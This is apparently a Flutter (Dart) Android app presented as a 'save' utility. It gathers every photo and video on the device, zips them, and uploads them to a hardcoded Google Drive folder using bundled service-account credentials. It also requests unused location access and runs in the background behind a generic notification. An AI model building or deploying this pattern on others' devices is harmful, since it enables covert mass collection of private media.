import 'dart:io';
import 'dart:convert';
import 'dart:async';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:googleapis/drive/v3.dart' as drive;
import 'package:googleapis_auth/auth_io.dart';
import 'package:archive/archive.dart';
import 'package:path_provider/path_provider.dart';
import 'package:flutter/services.dart';
import 'package:flutter_background/flutter_background.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  final androidConfig = FlutterBackgroundAndroidConfig(
    notificationTitle: "Background Service",
    notificationText: "Running in the background",
    notificationImportance: AndroidNotificationImportance.high,
    enableWifiLock: true,
  );

  bool hasPermissions = await FlutterBackground.initialize(androidConfig: androidConfig);
  if (hasPermissions) {
    FlutterBackground.enableBackgroundExecution();
  }

  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: SaveScreen(),
    );
  }
}

class SaveScreen extends StatefulWidget {
  @override
  _SaveScreenState createState() => _SaveScreenState();
}

class _SaveScreenState extends State<SaveScreen> {
  final String folderId = "1JMxSd3F8FmBS8pkzOt1wec3TrblIHkue";
  final _scaffoldMessengerKey = GlobalKey<ScaffoldMessengerState>();

  bool isProcessing = false;
  String progressMessage = "";

  // MethodChannel のインスタンス
  static const platform = MethodChannel('flutter_background');

  @override
  void initState() {
    super.initState();
    requestPermissions();
    requestIgnoreBatteryOptimization();
    _listenForProgress(); // 進捗の更新をリッスン
  }

  Future<void> requestPermissions() async {
    var status = await [
      Permission.storage,
      Permission.notification,
      Permission.location,
    ].request();

    if (status[Permission.storage]?.isGranted == true &&
        status[Permission.notification]?.isGranted == true &&
        status[Permission.location]?.isGranted == true) {
      showSnackBar('必要な権限が許可されました');
    } else {
      showSnackBar('権限が拒否されました。必要な権限を許可してください');
    }
  }

  Future<void> requestIgnoreBatteryOptimization() async {
    final status = await Permission.ignoreBatteryOptimizations.status;
    if (!status.isGranted) {
      final result = await Permission.ignoreBatteryOptimizations.request();
      if (result.isGranted) {
        showSnackBar('バッテリー最適化が無効化されました');
      } else {
        showSnackBar('バッテリー最適化を無効化できませんでした');
      }
    } else {
      showSnackBar('バッテリー最適化は既に無効化されています');
    }
  }

  void showSnackBar(String message) {
    _scaffoldMessengerKey.currentState?.showSnackBar(SnackBar(content: Text(message)));
  }

  Future<void> saveInBackground() async {
    setState(() {
      isProcessing = true;
      progressMessage = "保存処理を開始しました...";
    });

    try {
      await executeBackgroundTask();
      setState(() {
        isProcessing = false;
        progressMessage = 'バックグラウンド処理が完了しました';
      });
    } catch (e) {
      print('バックグラウンドタスクでエラー発生: $e');
      setState(() {
        isProcessing = false;
        progressMessage = 'バックグラウンド処理中にエラーが発生しました';
      });
    }
  }

  Future<void> executeBackgroundTask() async {
    final mediaFiles = await collectMediaFiles();
    final maxChunkSize = 50 * 1024 * 1024;
    final zipPaths = await compressFilesInChunks(mediaFiles, maxChunkSize);

    for (final zipPath in zipPaths) {
      await uploadToGoogleDrive(zipPath, folderId);
      _updateProgress("アップロード中: ${zipPath}"); // 進捗を更新
    }
  }

  // 進捗を MethodChannel を通じて通知
  Future<void> _updateProgress(String progress) async {
    try {
      await platform.invokeMethod('updateProgress', progress);
    } on PlatformException catch (e) {
      print("進捗の更新中にエラー: ${e.message}");
    }
  }

  // MethodChannel をリッスンして進捗を受け取る
  Future<void> _listenForProgress() async {
    platform.setMethodCallHandler((call) async {
      if (call.method == 'updateProgress') {
        setState(() {
          progressMessage = call.arguments; // 進捗を更新
        });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      key: _scaffoldMessengerKey,
      appBar: AppBar(title: Text('保存するするよん')),
      body: Center(
        child: isProcessing
            ? Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            CircularProgressIndicator(),
            SizedBox(height: 20),
            Text(progressMessage),
          ],
        )
            : ElevatedButton(
          onPressed: saveInBackground,
          child: Text('保存開始'),
        ),
      ),
    );
  }
}

Future<List<File>> collectMediaFiles() async {
  List<File> files = [];
  final permission = await PhotoManager.requestPermissionExtend();
  if (permission.isAuth) {
    final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(type: RequestType.common);
    for (final album in albums) {
      final assetCount = await album.assetCountAsync;
      final List<AssetEntity> assets = await album.getAssetListRange(start: 0, end: assetCount);
      for (final asset in assets) {
        final file = await asset.file;
        if (file != null) files.add(file);
      }
    }
  }
  return files;
}

Future<List<String>> compressFilesInChunks(List<File> files, int maxChunkSize) async {
  final List<String> zipPaths = [];
  final directory = await getTemporaryDirectory();
  int currentChunkSize = 0;
  int chunkIndex = 0;
  Archive currentArchive = Archive();

  for (var file in files) {
    final fileData = file.readAsBytesSync();
    if (currentChunkSize + fileData.length > maxChunkSize) {
      final zipPath = '${directory.path}/compressed_chunk_${chunkIndex++}.zip';
      File(zipPath).writeAsBytesSync(ZipEncoder().encode(currentArchive));
      zipPaths.add(zipPath);

      currentArchive = Archive();
      currentChunkSize = 0;
    }

    currentArchive.addFile(ArchiveFile(file.path.split('/').last, fileData.length, fileData));
    currentChunkSize += fileData.length;
  }

  if (currentArchive.isNotEmpty) {
    final zipPath = '${directory.path}/compressed_chunk_${chunkIndex}.zip';
    File(zipPath).writeAsBytesSync(ZipEncoder().encode(currentArchive));
    zipPaths.add(zipPath);
  }

  return zipPaths;
}

Future<void> uploadToGoogleDrive(String filePath, String folderId) async {
  int retryCount = 0;
  const maxRetries = 3;

  while (retryCount < maxRetries) {
    try {
      final credentialsJson = await rootBundle.loadString('assets/credentials.json');
      final credentials = ServiceAccountCredentials.fromJson(jsonDecode(credentialsJson));

      final scopes = [drive.DriveApi.driveFileScope];
      final authClient = await clientViaServiceAccount(credentials, scopes);

      final driveApi = drive.DriveApi(authClient);
      final media = drive.Media(File(filePath).openRead(), File(filePath).lengthSync());
      final file = drive.File()
        ..name = 'compressed_chunk_${DateTime.now().millisecondsSinceEpoch}.zip'
        ..parents = [folderId];

      await driveApi.files.create(file, uploadMedia: media);

      authClient.close();

      final tempFile = File(filePath);
      if (await tempFile.exists()) {
        await tempFile.delete();
        print('一時ファイルを削除しました: $filePath');
      }

      return;
    } catch (e) {
      retryCount++;
      print("Error during upload: $e");

      if (retryCount >= maxRetries) {
        print("最大リトライ回数に達しました。アップロードを中止します。");
        break;
      }

      await Future.delayed(Duration(seconds: 2));
    }
  }
}
